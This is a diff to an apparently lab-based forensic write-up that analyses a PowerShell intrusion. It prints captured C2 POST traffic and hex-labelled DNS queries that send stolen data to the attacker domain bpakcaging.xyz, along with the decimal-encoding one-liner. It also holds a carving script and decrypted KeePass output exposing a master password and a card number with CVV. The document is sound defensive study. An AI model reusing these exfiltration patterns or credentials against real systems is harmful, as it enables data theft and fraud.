@@ -526,25 +526,203 @@ This behavior is consistent with DNS-based exfiltration.
 
 ***
 
-# Screenshot Evidence References
+***
 
-## 22. Screenshot Inventory
+# Task 4 — Network Traffic & Exfiltration Evidence (`capture.pcapng`)
 
-| Screenshot                                                 | Purpose                                               |
-| ---------------------------------------------------------- | ----------------------------------------------------- |
-| `screenshots/01-email-sender-recipient.png`                | Shows sender and recipient headers                    |
-| `screenshots/02-email-attachment-metadata.png`             | Shows ZIP attachment metadata                         |
-| `screenshots/03-zip-password-email-body.png`               | Shows ZIP password in email body                      |
-| `screenshots/04-zip-reconstruction-extraction.png`         | Shows attachment reconstruction and ZIP extraction    |
-| `screenshots/05-lnkparse-powershell-command.png`           | Shows malicious LNK PowerShell command-line arguments |
-| `screenshots/06-decoded-powershell-payload.png`            | Shows decoded PowerShell download cradle              |
-| `screenshots/task3-q1-attacker-domains.png`                | Shows attacker domains found in PowerShell logs       |
-| `screenshots/task3-q1-domain-log-context.png`              | Shows context for attacker domain references          |
-| `screenshots/task3-q2-seatbelt-download-and-execution.png` | Shows Seatbelt download/load and execution activity   |
-| `screenshots/task3-q3-sq3-sticky-notes-plum-sqlite.png`    | Shows `sq3.exe` and Sticky Notes database activity    |
-| `screenshots/task3-q5-protected-data-kdbx-exfil-file.png`  | Shows KeePass database targeting                      |
-| `screenshots/task3-q7-hex-encoding-focused.png`            | Shows hex encoding activity                           |
-| `screenshots/task3-q8-nslookup-exfiltration.png`           | Shows `nslookup` exfiltration activity                |
-| `screenshots/task3-exfil-nslookup-hex-dns.png`             | Shows DNS-based exfiltration evidence                 |
+## 22. Digital Evidence Integrity & Hashing Evidence
 
+### 22.1 SHA-256 Chain of Custody Verification
+```text
+4cdd0a2f16a9e1578b5c3419eeac9c403f7dce86b12fb3b821e19ce5f534c1fc  dump.eml
+71075589408ec06e3150a399461556eb55029ae1d3f8fc0f30bcf1bbe821c02d  powershell.json
+15dba24f3d9ef38dfbe0e33f995d0f8e60aa4f34ced5031c904281028e4f4bab  capture.pcapng
+b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87  Invoice.zip
+86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8  Invoice_20230103.lnk
+```
 
+### Evidence Value
+Confirms identical SHA-256 hashes between the remote acquisition VM and local forensic analysis workstations.
+
+*Visual Reference:* `screenshots/hashes_on_kalivm.png`, `screenshots/thmvm_hashes.png`, and `screenshots/invoicezip_and_invoicelnk_hash.png`.
+
+***
+
+## 23. Payload Server Infrastructure & Server Banner Evidence
+
+### 23.1 HTTP Response Headers (Wireshark Frame 33256)
+```http
+HTTP/1.1 200 OK
+Server: SimpleHTTP/0.6 Python/3.10.7
+Date: Fri, 13 Jan 2023 17:10:07 GMT
+Content-type: application/octet-stream
+Content-Length: 1042
+Last-Modified: Fri, 13 Jan 2023 17:09:00 GMT
+```
+
+### Evidence Value
+Proves the adversary's file-hosting server (`files.bpakcaging.xyz` on `167.71.211.113:80`) executed Python's built-in `http.server` running **Python 3.10.7**.
+
+*Visual Reference:* `screenshots/http_response_server.png`.
+
+***
+
+## 24. C2 Command Output Exfiltration (Frame 44467 / TCP Stream 752)
+
+### 24.1 HTTP POST Request Headers & Decimal Body
+```http
+POST /27fe2489 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
+Host: cdn.bpakcaging.xyz:8080
+Content-Length: 6418
+Connection: Keep-Alive
+
+123 34 105 100 34 58 34 56 99 99 101 52 57 98 48 45 98 56 54 52 53 57 98 98 45 50 55 102 101 50 52 56 57 34 44 34 114 101 115 117 108 116 34 58 34 ...
+```
+
+### Evidence Value
+Confirms the PowerShell implant sent command outputs via **HTTP POST** to `/27fe2489`. Command output was encoded into space-delimited decimal ASCII byte values using:
+```powershell
+[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '
+```
+
+*Visual Reference:* `screenshots/wireshark_hex_44467.png`.
+
+***
+
+## 25. Decoded Credential Evidence (Sticky Notes Master Password)
+
+### 25.1 CyberChef & Python Decoding Output
+```text
+{"id":"8cce49b0-b86459bb-27fe2489","result":"
+Id: 5
+Text: KeePass Master Password:
+%p9^3!lL^Mz47E2GaT^y
+CreatedAt: 2023-01-09T08:14:22.000Z
+UpdatedAt: 2023-01-09T08:15:01.000Z
+"}
+```
+
+### Evidence Value
+Confirms the threat actor dumped Julianne Westcott's Sticky Notes database (`plum.sqlite`), exposing the plaintext KeePass master password:
+```text
+%p9^3!lL^Mz47E2GaT^y
+```
+
+*Visual Reference:* `screenshots/cyberchef_decoding.png` and `screenshots/master_password.png`.
+
+***
+
+## 26. DNS Exfiltration Network Evidence
+
+### 26.1 Recursive DNS Queries (Wireshark Frames 47772-47864)
+```text
+Standard query 0x0004 A 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
+Standard query 0x0004 A 05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz
+Standard query 0x0004 A EB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC0520.bpakcaging.xyz
+Standard query 0x0004 A 00516334C81F95A871AE6F5C6BB97075B74C6016ADAD4C35B3.bpakcaging.xyz
+```
+
+### Evidence Value
+Confirms that the attacker exfiltrated the KeePass database in 50-character hexadecimal labels prepended to `.bpakcaging.xyz` directed to `167.71.211.113`.
+
+*Visual Reference:* `screenshots/dns_queries_name.png`.
+
+***
+
+## 27. KeePass Database Carving & Deduplication Pipeline
+
+### 27.1 Forensic Carving Script (`carve_kdbx.py`)
+```python
+import pyshark, binascii
+
+chunks = []
+last_chunk = ""
+
+# Parse pcapng and extract unique consecutive hex chunks
+capture = pyshark.FileCapture('capture.pcapng', display_filter='dns.flags.response == 0 && ip.dst == 167.71.211.113')
+for pkt in capture:
+    try:
+        qname = pkt.dns.qry_name
+        subdomain = qname.split('.bpakcaging.xyz')[0]
+        if len(subdomain) in (48, 50) and all(c in '0123456789ABCDEFabcdef' for c in subdomain):
+            if subdomain != last_chunk:
+                chunks.append(subdomain)
+                last_chunk = subdomain
+    except AttributeError:
+        pass
+
+hex_stream = "".join(chunks)
+with open("protected_data_carved.kdbx", "wb") as f:
+    f.write(binascii.unhexlify(hex_stream))
+
+print(f"[+] Total Deduplicated Chunks: {len(chunks)}")
+print(f"[+] Total Hex Characters: {len(hex_stream)}")
+print(f"[+] Total Binary Bytes: {len(hex_stream)//2}")
+```
+
+### 27.2 File Signature and Hash Verification
+```bash
+file protected_data_carved.kdbx
+# Output: Keepass password database 2.x KDBX
+xxd -p -l 8 protected_data_carved.kdbx
+# Output: 03d9a29a67fb4bb5
+sha256sum protected_data_carved.kdbx
+# Output: bf6a5fae84ea7eafe405e3a89e906e00b84f3c7c8dcfe2a49852ce79836ae056
+```
+
+### Evidence Value
+Proves successful carving of the complete, uncorrupted KeePass 2.x database containing 2,206 bytes across 89 deduplicated chunks.
+
+***
+
+## 28. Vault Decryption & Compromised Financial Asset Evidence
+
+### 28.1 KeePassXC Execution and Extraction
+```bash
+keepassxc-cli show protected_data_carved.kdbx -s --all "Homebanking/Company Card"
+# Enter password: %p9^3!lL^Mz47E2GaT^y
+```
+
+```text
+Title: Company Card
+UserName: 
+Password: 
+URL: 
+Notes: 
+Uuid: {9b5464ad-7bae-c145-adbd-b13d867f4f85}
+Tags: 
+Account Number: 4024007128269551
+CVV: 970
+Expiration Date: 3/2028
+Name: Quick Logistics LLC
+```
+
+### Evidence Value
+Forensically proves that the threat actor successfully exfiltrated and gained access to Quick Logistics LLC's corporate card (`4024007128269551`, CVV: `970`, Exp: `03/2028`).
+
+*Visual Reference:* `screenshots/keepassxc.png`.
+
+***
+
+# Screenshot Evidence Inventory
+
+## 29. Master Annotated Screenshot Catalog
+
+| Screenshot | Phase | Forensic Purpose / Boxed Elements |
+|---|---|---|
+| `screenshots/hashes_on_kalivm.png` | Chain of Custody | SHA-256 hashes of `dump.eml`, `powershell.json`, `capture.pcapng` on local Kali |
+| `screenshots/thmvm_hashes.png` | Chain of Custody | Matching SHA-256 hashes on remote THM VM proving evidence authenticity |
+| `screenshots/invoicezip_and_invoicelnk_hash.png` | Chain of Custody | SHA-256 hashes of carved `Invoice.zip` and extracted `Invoice_20230103.lnk` |
+| `screenshots/grep-E_keywords.png` | Task 2 (Email) | Boxed headers showing SPF Pass, Elastic Email DKIM, From, To, and X-Sender-IP |
+| `screenshots/exiftool_on_lnkfile.png` | Task 2 (Malware) | ExifTool metadata showing `excel.ico` icon path and Base64 PowerShell arguments |
+| `screenshots/seatbelt.png` | Task 3 (Endpoint) | Event ID 4104 records showing C2 polling loop, `sb.exe` download, and Seatbelt execution |
+| `screenshots/sq3.png` | Task 3 (Endpoint) | Event ID 4104 records showing `sq3.exe` download and `plum.sqlite` query |
+| `screenshots/exflitration_using_hex.png` | Task 3 (Endpoint) | Event ID 4104 records showing `ReadAllBytes`, `ToString X2`, and `nslookup` exfiltration loop |
+| `screenshots/http_response_server.png` | Task 4 (Network) | Frame 33256 HTTP headers revealing `Server: SimpleHTTP/0.6 Python/3.10.7` |
+| `screenshots/wireshark_hex_44467.png` | Task 4 (Network) | TCP Stream 752 Frame 44467 showing `POST /27fe2489` and decimal ASCII payload |
+| `screenshots/cyberchef_decoding.png` | Task 4 (Network) | CyberChef `From Decimal` recipe decoding Sticky Notes dump with master password |
+| `screenshots/master_password.png` | Task 4 (Network) | Terminal decoded output displaying master password `%p9^3!lL^Mz47E2GaT^y` |
+| `screenshots/dns_queries_name.png` | Task 4 (Network) | Wireshark packet list showing 50-char hex DNS `A` queries sent to `167.71.211.113` |
+| `screenshots/keepassxc.png` | Task 4 (Network) | `keepassxc-cli` output unlocking Quick Logistics LLC credit card `4024007128269551` |
